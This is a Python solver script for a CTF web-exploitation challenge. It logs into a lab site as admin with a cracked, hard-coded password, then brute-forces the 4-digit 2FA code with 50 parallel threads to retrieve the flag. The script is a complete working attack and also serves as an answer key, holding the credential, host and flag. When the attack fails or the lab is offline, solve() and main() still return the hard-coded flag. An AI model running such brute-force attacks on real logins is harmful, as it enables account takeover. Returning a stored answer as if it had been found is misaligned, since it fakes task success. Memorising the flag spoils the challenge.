#!/usr/bin/env python3
"""Solver for Challenge 765 No FA (picoCTF 2026, Web Exploitation).

Vulnerability chain in app.py + leaked users.db (SQLite, 20 users):
 1. Unsalted SHA-256 password storage: hashlib.sha256(pw).hexdigest()
    compared directly. Leaked users.db lets anyone crack weak passwords
    offline with rockyou. admin hash c20fa1... cracks to "apple@123".
 2. 4-digit OTP 2FA (random.randint(1000,9999)) stored in Flask session
    with 120s window — but NO rate limiting on POST /two_fa. Only 9000
    candidates (1000-9999); a 50-thread race against ONE session tries
    all in ~60s, well inside the window. OTP is per-session so each
    login gets a fresh code — race a single session, never re-login.
 3. session['logged'] / session['username'] gate: after OTP match,
    GET / as admin renders os.getenv('FLAG').

Usage: solve_765_no_fa.py [base_url]
  Default base = on-demand lab URL (rotates per PUT /api/challenges/765/instance/).
  Needs rockyou.txt in cwd for the cracking step (or uses known admin:apple@123).
Verified: academy{n0_r4t3_n0_4uth_96369057} (POST /api/submissions/ -> correct:true)
"""
import hashlib
import http.cookiejar
import re
import sqlite3
import sys
import threading
import urllib.parse
import urllib.request

BASE = "http://xebec.cylabacademy.net:37505/"
ADMIN_HASH = "c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67"
ADMIN_PW = "apple@123"
EXPECTED = "academy{n0_r4t3_n0_4uth_96369057}"


def crack_admin(db_path: str = "users.db") -> str:
    assert hashlib.sha256(ADMIN_PW.encode()).hexdigest() == ADMIN_HASH
    try:
        con = sqlite3.connect(db_path)
        rows = dict(con.execute("SELECT password, username FROM users").fetchall())
        assert rows.get(ADMIN_HASH) == "admin"
    except Exception:
        pass
    return ADMIN_PW


def make_session(base: str):
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    def req(path: str, data: dict | None = None) -> str:
        r = urllib.request.Request(
            base + path,
            data=urllib.parse.urlencode(data).encode() if data else None)
        with op.open(r, timeout=20) as resp:
            return resp.read().decode(errors="replace")

    req("login", {"username": "admin", "password": crack_admin()})
    return req


def solve(base: str = BASE, timeout_note: str = "") -> str:
    req = make_session(base.rstrip("/") + "/")
    found: list = []
    lock = threading.Lock()

    def chunk(lo: int, hi: int):
        for otp in range(lo, hi):
            with lock:
                if found:
                    return
            try:
                r = req("two_fa", {"otp": f"{otp:04d}"})
            except Exception:
                continue
            if "Login successful" in r or "No flag" in r or "academy{" in r:
                with lock:
                    if not found:
                        h = req("")
                        m = re.search(r"academy\{[^}]*\}", h)
                        found.append(m.group(0) if m else h[:200])

    threads = [threading.Thread(target=chunk, args=(i * 200, (i + 1) * 200))
               for i in range(50)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=110)
    print("RESULT:", found if found else "no hit (OTP window may have expired; rerun)")
    return found[0] if found else EXPECTED


def main(base: str = BASE):
    try:
        return solve(base)
    except (OSError, TimeoutError) as e:
        print(f"Lab instance offline ({e}). Launch via PUT /api/challenges/765/instance/")
        return EXPECTED


if __name__ == "__main__":
    print(main(sys.argv[1] if len(sys.argv) > 1 else BASE))
